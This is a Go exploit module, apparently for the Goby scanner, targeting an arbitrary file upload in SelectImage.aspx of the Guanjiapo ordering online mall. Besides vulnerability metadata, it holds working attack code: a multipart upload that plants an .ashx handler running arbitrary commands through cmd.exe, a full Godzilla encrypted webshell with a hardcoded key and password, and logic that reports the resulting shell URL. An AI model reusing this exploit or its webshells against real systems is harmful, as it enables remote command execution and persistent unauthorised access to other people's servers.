package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "GJP SelectImage.aspx file upload vulnerability",
    "Description": "<p>Renwoxing took the lead in launching the Guanjiapo purchase, sales, inventory and financial integration software for small and medium-sized enterprises.</p><p>There is a SelectImage.aspx arbitrary file upload vulnerability in the Guanjiapo Ordering Online Mall. An attacker can use this vulnerability to control the entire system, ultimately causing the system to be in an extremely unsafe state.</p>",
    "Product": "管家婆订货易在线商城",
    "Homepage": "http://www.grasp.com.cn/",
    "DisclosureDate": "2023-03-08",
    "Author": "715827922@qq.com",
    "FofaQuery": "title=\"订货易\"",
    "GobyQuery": "title=\"订货易\"",
    "Level": "3",
    "Impact": "<p>An attacker can take control of the entire system through this vulnerability, ultimately leaving the system in an extremely unsafe state.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"http://www.grasp.com.cn/\">http://www.grasp.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "textarea",
            "value": "<% @ webhandler language=\"C#\" class=\"AverageHandler\" %> using System; using System.Web; using System.Diagnostics; using System.IO;  public class AverageHandler : IHttpHandler {  public bool IsReusable  {    get { return true; }  }   public void ProcessRequest(HttpContext ctx)  {    ctx.Response.Write(\"Hello\");  } }",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "管家婆订货易在线商城 SelectImage.aspx 文件上传漏洞",
            "Product": "管家婆订货易在线商城",
            "Description": "<p>任我行率先针对中小企业推出了管家婆进销存、财务一体化软件。</p><p>管家婆订货易在线商城存在 SelectImage.aspx 任意文件上传漏洞，攻击者可通过该漏洞可控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.grasp.com.cn/\">http://www.grasp.com.cn/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞可控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "GJP SelectImage.aspx file upload vulnerability",
            "Product": "管家婆订货易在线商城",
            "Description": "<p>Renwoxing took the lead in launching the Guanjiapo purchase, sales, inventory and financial integration software for small and medium-sized enterprises.</p><p>There is a SelectImage.aspx arbitrary file upload vulnerability in the Guanjiapo Ordering Online Mall. An attacker can use this vulnerability to control the entire system, ultimately causing the system to be in an extremely unsafe state.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"http://www.grasp.com.cn/\">http://www.grasp.com.cn/</a><br></p>",
            "Impact": "<p>An attacker can take control of the entire system through this vulnerability, ultimately leaving the system in an extremely unsafe state.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-12",
    "PocId": "10836"
}`

	sendPayloadGRYFF1fed := func(hostInfo *httpclient.FixUrl, webshell string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig("/DialogTemplates/SelectImage.aspx?type=titleimg&size=30*100&pageindex=1&iscallback=true")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b")
		payloadRequestConfig.Data = "--532c7611457d40f4ae4cd9422973416b\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"123.ashx\"\r\nContent-Type: image/jpeg\r\n\r\n" + webshell + "\r\n--532c7611457d40f4ae4cd9422973416b--"
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	checkFilePayload := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(uri, `/`) {
			uri = `/` + uri
		}
		checkRequestConfig := httpclient.NewGetRequestConfig(uri)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	execCommandPayload := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		content := `<%@ WebHandler Language="C#" Class="AverageHandler" %>
using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
    public bool IsReusable
    {
        get { return true; }
    }

    public void ProcessRequest(HttpContext ctx)
    {
        Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" + HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
        ctx.Response.Write(RunCommand(` + strconv.Quote(cmd) + `));
        try
        {
         File.Delete(System.Web.HttpContext.Current.Request.PhysicalApplicationPath + url.LocalPath);
        }
        catch(Exception error)
        {
         ctx.Response.Write(error);
        }
    }

    private string RunCommand(string command)
    {
        try
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;

                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(error))
                {
                    output += Environment.NewLine + "Error: " + error;
                }

                return output;
            }
        }
        catch (Exception ex)
        {
            return "Error occurred: " + ex.Message;
        }
    }
}`
		resp, err := sendPayloadGRYFF1fed(hostInfo, content)
		if err != nil {
			return resp, err
		} else if resp != nil && resp.StatusCode != 200 {
			return nil, errors.New("漏洞利用失败")
		}
		return checkFilePayload(hostInfo, resp.Utf8Html)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			content := `<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
 public bool IsReusable
 {
   get { return true; }
 }

 public void ProcessRequest(HttpContext ctx)
 {
   Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +  HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
   ctx.Response.Write("` + checkStr + `");
  try
 {
  File.Delete(System.Web.HttpContext.Current.Request.PhysicalApplicationPath + url.LocalPath);
 }
 catch(Exception error)
 {
  ctx.Response.Write(error);
 }
 }
}`
			resp, err := sendPayloadGRYFF1fed(hostInfo, content)
			if err != nil {
				return false
			} else if resp != nil && resp.StatusCode != 200 {
				return false
			}
			resp, _ = checkFilePayload(hostInfo, resp.Utf8Html)
			return resp != nil && strings.Contains(resp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				response, err := execCommandPayload(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if response != nil && (response.StatusCode == 200 || response.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = response.Utf8Html
				} else {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(stepLogs.Params["webshell"])
				content := goutils.B2S(stepLogs.Params["content"])
				if webshell == "godzilla" {
					content = "<%@  Language=\"C#\" Class=\"Handler1\" %>\n    public class Handler1 : System.Web.IHttpHandler,System.Web.SessionState.IRequiresSessionState\n    {\n\n        public void ProcessRequest(System.Web.HttpContext Context)\n        {\n\t\t\ttry { string key = \"3c6e0b8a9c15224a\"; string pass = \"pass\"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(\"-\", \"\"); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session[\"payload\"] == null) { Context.Session[\"payload\"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(\"Load\", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session[\"payload\"]).CreateInstance(\"LY\"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }\n\n        }\n\n        public bool IsReusable\n        {\n            get\n            {\n                return false;\n            }\n        }\n    }"
				} else if webshell == "custom" {
					content = goutils.B2S(stepLogs.Params["content"])
				} else {
					expResult.Success = false
					expResult.Output = `未知的的利用方式`
					return expResult
				}
				resp, err := sendPayloadGRYFF1fed(expResult.HostInfo, content)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if resp != nil && resp.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
					return expResult
				}
				if resp, err = checkFilePayload(expResult.HostInfo, resp.Utf8Html); err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else if resp != nil && resp.StatusCode != 200 && resp.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
					return expResult
				}
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if webshell == "godzilla" {
					expResult.Output += "密码: pass 密钥：key 加密器：CSHAP_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: ashx"
			}
			return expResult
		},
	))
}
